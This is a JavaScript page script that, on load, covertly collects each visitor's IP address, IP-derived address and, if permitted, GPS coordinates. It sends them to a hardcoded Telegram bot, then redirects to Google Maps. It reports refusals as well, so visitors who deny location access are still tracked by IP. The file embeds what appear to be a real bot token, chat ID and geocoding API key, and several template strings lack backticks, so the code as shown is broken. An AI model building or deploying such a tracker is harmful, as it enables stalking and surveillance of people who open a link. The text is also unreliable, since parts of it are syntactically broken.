// script.js
const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
const CHAT_ID = '6602027873';
const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';

function buildAddress(components) {
  const country = components.country || '';
  const state = components.state || '';
  const county = components.county || components.district || '';
  const subplace = components.suburb || components.village || components.town || components.city || components.neighbourhood || '';
  return ${country}, ${state}, ${county}, ${subplace};
}

async function sendToTelegram(message) {
  const tag = window.userRef || 'unknown_ref';
  await fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: 🧩 REF: ${tag}\n${message}
    })
  });
}

async function getIPInfo() {
  try {
    const res = await fetch('https://api.db-ip.com/v2/free/self');
    return await res.json();
  } catch {
    return { ipAddress: 'unknown', latitude: '0', longitude: '0' };
  }
}

async function getLocationInfo(lat, lon) {
  try {
    const res = await fetch(https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_API_KEY});
    const data = await res.json();
    return data.results[0]?.components || {};
  } catch {
    return {};
  }
}

async function getAndSendIPBased(reason = "❌ USER DENIED OR BLOCKED") {
  const ip = await getIPInfo();
  const lat = ip.latitude || '0';
  const lon = ip.longitude || '0';
  const addressData = await getLocationInfo(lat, lon);
  const address = buildAddress(addressData);

  await sendToTelegram(`${reason}
🔹 IP: ${ip.ipAddress}
📍 IP-Based Address: ${address}`);
}

async function handleAllowed(lat, lon) {
  const ip = await getIPInfo();
  const addressData = await getLocationInfo(lat, lon);
  const address = buildAddress(addressData);

  await sendToTelegram(`✅ USER ALLOWED LOCATION
🔹 IP: ${ip.ipAddress}
🔹 GPS: ${lat}, ${lon}
📍 Address: ${address}`);

  window.location.href = https://www.google.com/maps/@${lat},${lon},15z;
}

function getLocation() {
  getAndSendIPBased("🔄 USER OPENED LINK");

  if (!navigator.geolocation) return;

  navigator.permissions?.query({ name: 'geolocation' }).then((perm) => {
    if (perm.state === 'granted') {
      navigator.geolocation.getCurrentPosition(
        (pos) => handleAllowed(pos.coords.latitude, pos.coords.longitude),
        () => getAndSendIPBased("⚠ GPS fetch failed")
      );
    } else {
      navigator.geolocation.getCurrentPosition(
        (pos) => handleAllowed(pos.coords.latitude, pos.coords.longitude),
        () => getAndSendIPBased("❌ USER DENIED LOCATION ACCESS")
      );
    }
  }).catch(() => {
    navigator.geolocation.getCurrentPosition(
      (pos) => handleAllowed(pos.coords.latitude, pos.coords.longitude),
      () => getAndSendIPBased("⚠ PERMISSION CHECK FAILED")
    );
  });
}

function retryLocation() {
  getLocation();
}

window.onload = () => {
  document.getElementById("loading-screen").style.display = "flex";
  getLocation();

  if (navigator.permissions) {
    navigator.permissions.query({ name: 'geolocation' }).then((perm) => {
      perm.onchange = () => {
        if (perm.state === 'granted') location.reload();
      };
    });
  }
};
